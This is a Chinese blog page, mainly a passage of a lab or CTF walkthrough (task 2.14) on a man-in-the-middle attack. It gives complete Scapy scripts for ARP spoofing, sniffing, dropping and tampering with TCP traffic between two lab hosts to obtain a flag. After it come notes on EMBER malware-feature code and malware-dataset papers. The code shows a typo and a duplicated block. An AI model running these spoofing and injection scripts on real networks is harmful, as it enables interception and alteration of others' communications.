<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><a href="#2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic" class="headerlink" title="2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic"></a>2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</h3><p>这是一个经典的中间人攻击，我们要使用arp欺诈拦截服务器<code>10.0.0.3</code>与客户端<code>10.0.0.4</code>之间的通信并篡改以获取flag：</p>
<ul>
<li><p>首先通过ifconfig命令获取网络接口eth0的mac地址，之后执行脚本实现arp欺诈：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标和受害者的IP地址</span></span><br><span class="line">victim_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line">my_mac = <span class="string">&quot;86:a6:ab:d4:f3:c2&quot;</span>  <span class="comment"># 获取当前接口的MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">victim_ip, spoof_ip</span>):</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定期发送ARP包维持欺骗状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            arp_spoof(victim_ip, target_ip)  <span class="comment"># 欺骗victim_ip，使其认为target_ip对应的MAC是我的MAC</span></span><br><span class="line">            arp_spoof(target_ip, victim_ip)  <span class="comment"># 欺骗target_ip，使其认为victim_ip对应的MAC是我的MAC</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] 停止ARP欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">        <span class="comment"># restore_network()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_network</span>():</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">spoof()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后我们可以通过下面的脚本查看通信内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3s&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>接着使用下面的命令，用来丢弃所有E开头的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tc qdisc add dev eth0 root handle 1: prio</span><br><span class="line">sudo tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match u8 0x45 0xff at 52 action drop</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后执行下脚本篡改数据包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/08/ember-code-analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/08/ember-code-analysis/" class="post-title-link" itemprop="url">ember-code-analysis</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-08 14:24:07" itemprop="dateCreated datePublished" datetime="2024-06-08T14:24:07+08:00">2024-06-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-06-12 14:14:09" itemprop="dateModified" datetime="2024-06-12T14:14:09+08:00">2024-06-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ember源码解析"><a href="#ember源码解析" class="headerlink" title="ember源码解析"></a>ember源码解析</h1><h2 id="features-py"><a href="#features-py" class="headerlink" title="features.py"></a><code>features.py</code></h2><p>思考：</p>
<ol>
<li>如何修改二进制代码，在保留恶意功能的同时破坏特征值</li>
<li>如何挑选效果更好的特征值</li>
</ol>
<ul>
<li><p>用于抽取二进制码特征的父类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FeatureType</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">raw_features</span>(<span class="params">self, bytez, lief_binary</span>): <span class="comment"># 生成一个可以被JSON序列化的特征表示。</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">process_raw_features</span>(<span class="params">self, raw_obj</span>): <span class="comment"># 用于处理 raw_obj 并将其转换为具体的特征向量 </span></span><br><span class="line">    </span><br><span class="line">  <span class="comment"># 这是一个具体方法，它提供了从原始字节和二进制文件中直接计算特征向量的功能。</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">feature_vector</span>(<span class="params">self, bytez, lief_binary</span>): </span><br><span class="line">    <span class="keyword">return</span> self.process_raw_features(self.raw_features(bytez, lief_binary))</span><br></pre></td></tr></table></figure>
</li>
<li><p>继承 featureType，实现字节直方图的计算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ByteHistogram</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>
</li>
<li><p>用于计算基于字节值和局部熵的二维直方图，这种直方图是基于熵的度量来近似字节值和其局部熵的联合概率分布。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ByteEntropyHistogram</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>
</li>
<li><p>用于提取与文件段（sections）相关的特征信息，如段名称、大小、熵等，并使用哈希技巧（特征哈希）来汇总所有段信息成一个特征向量。</p>
</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SectionInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>

<ul>
<li><p>该类专门用于从二进制文件中提取有关导入库和函数的信息，主要处理和转换这些信息为特征向量。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ImportsInfo</span>(<span class="title class_ inherited__">FeatureType</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>从二进制文件中提取导出函数的信息，并将其转换为特征向量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExportsInfo</span>(<span class="title class_ inherited__">FeatureType</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>提取二进制文件的一般信息，并将这些信息转换成特征向量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GeneralFileInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>
</li>
<li><p>从二进制文件的头部信息中提取相关的机器、架构、操作系统、链接器以及其他信息，并将这些信息转换为特征向量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HeaderFileInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>
</li>
<li><p>从二进制文件的原始字节流中提取字符串信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringExtractor</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当分析一个文件（可能是一个文档、压缩包或另一个可执行文件）的二进制内容时，搜索包含“MZ”字样的字节序列是寻找嵌入可执行文件的一个简单且有效的方法。若在文件中的非起始位置发现“MZ”标记，这可能意味着有一个或多个可执行文件被嵌入或附加到了主文件中。</p>
</blockquote>
</li>
<li><p>从二进制文件的数据目录中提取大小和虚拟地址信息，并将这些信息转换为特征向量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataDirectories</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a><code>__init__.py</code></h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/02/AVCLASS2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/02/AVCLASS2/" class="post-title-link" itemprop="url">AVCLASS2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-06-02 13:43:51 / 修改时间：14:46:49" itemprop="dateCreated datePublished" datetime="2024-06-02T13:43:51+08:00">2024-06-02</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>55</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels"><a href="#AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels" class="headerlink" title="AVclass2: Massive Malware Tag Extraction from AV Labels"></a>AVclass2: Massive Malware Tag Extraction from AV Labels</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/28/A-Deep-Dive-into-VirusTotal/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/28/A-Deep-Dive-into-VirusTotal/" class="post-title-link" itemprop="url">A Deep Dive into VirusTotal</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-05-28 15:10:11" itemprop="dateCreated datePublished" datetime="2024-05-28T15:10:11+08:00">2024-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-30 13:58:45" itemprop="dateModified" datetime="2024-05-30T13:58:45+08:00">2024-05-30</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="A-Deep-Dive-into-VirusTotal-Characterizing-and-Clustering-a-Massive-File-Feed"><a href="#A-Deep-Dive-into-VirusTotal-Characterizing-and-Clustering-a-Massive-File-Feed" class="headerlink" title="A Deep Dive into VirusTotal: Characterizing and Clustering a Massive File Feed"></a>A Deep Dive into VirusTotal: Characterizing and Clustering a Massive File Feed</h1><h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><p>论文回答的问题：</p>
<ul>
<li><p>这个源的多样性如何？</p>
<p>这个问题询问VT文件源中样本的多样性程度。多样性包括不同类型的恶意软件、不同的攻击技术、不同操作系统的恶意软件等。多样性高意味着数据源可以提供广泛的恶意软件样本，有助于研究和测试不同的防御机制。</p>
</li>
<li><p>它是否允许构建针对不同文件类型的恶意软件数据集？</p>
